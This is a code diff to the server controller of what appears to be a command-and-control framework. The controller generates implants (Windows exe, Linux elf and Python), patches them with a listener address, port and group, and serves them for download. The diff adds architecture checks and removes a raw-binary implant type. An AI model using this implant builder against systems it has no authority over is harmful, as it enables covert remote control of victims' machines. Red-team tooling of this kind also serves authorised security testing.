@@ -7,7 +7,7 @@ import  path from 'path';
 import  {resolve} from 'path';
 import { set_server, set_ssl_server } from "../Servers/http_servers.mjs";
 import { writeLog } from "../Utils/writeLog.mjs";
-import { bin_processing, exe_processing, python_processing } from "../Utils/implant_processing.mjs";
+import { exe_processing, python_processing } from "../Utils/implant_processing.mjs";
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -262,10 +262,15 @@ const delete_listener= async( req, res = response, listeners) => {
 const create_implant_controller = async(req, res=response)=>{
 
     try {
-        const { type="", system="", listener=0, group="default" } = req.body;
+        const { type="", system="", arch="", listener=0, group="default" } = req.body;
 
 
         let implant_path="";
+
+        if(arch != "x64" && arch != "x86") return res.status(400).json({
+            ok:false,
+            msg:"Invalid arch"
+        })
 
         switch (system) {
             case "linux":
@@ -331,29 +336,23 @@ const create_implant_controller = async(req, res=response)=>{
         }
 
 
-        let extension;
         let result_path;
+
+        let ext;
 
         switch (type) {
             case "exe":{
-                implant_path = `${implant_path}/exe/base.exe`;
+                ext = system === "windows" ? "exe" : "elf"
+                implant_path = `${implant_path}/exe/base_${arch}.${ext}`;
                 implant_path = path.normalize(implant_path);
-                result_path = await exe_processing(implant_path, found_listener.url, found_listener.port, group)
-                extension='exe'
+                result_path = await exe_processing(implant_path, found_listener.url, found_listener.port, group, system)
                 break;
             }
             case "py":{
                 implant_path = `${implant_path}/python/base.py`;
                 implant_path = path.normalize(implant_path);
-                result_path = await python_processing(implant_path, found_listener.url, found_listener.port, group)
-                extension='py'
-                break;
-            }
-            case "bin":{
-                implant_path = `${implant_path}/bin/base.bin`;
-                implant_path = path.normalize(implant_path);
-                result_path = await bin_processing(implant_path, found_listener.url, found_listener.port, group)
-                extension='bin'
+                result_path = await python_processing(implant_path, found_listener.url, found_listener.port, group, system)
+                ext='py'
                 break;
             }
             default:
@@ -363,21 +362,16 @@ const create_implant_controller = async(req, res=response)=>{
                 })
             }
 
-
             
         result_path = path.join(__dirname , result_path);
         const data = await fs.readFile(result_path);
         res.writeHead(200,{
             'Content-Type': 'application/octect-stream',
-            'Content-Disposition': `attachment; filename="file.${extension}"`,
+            'Content-Disposition': `attachment; filename="file.${ext}"`,
             'Content-Length': data.length,
         })
         res.end(data)
 
-/*         return res.status(200).json({
-            ok:true,
-            msg:implant_path
-        }) */
 
 
     } catch (error) {
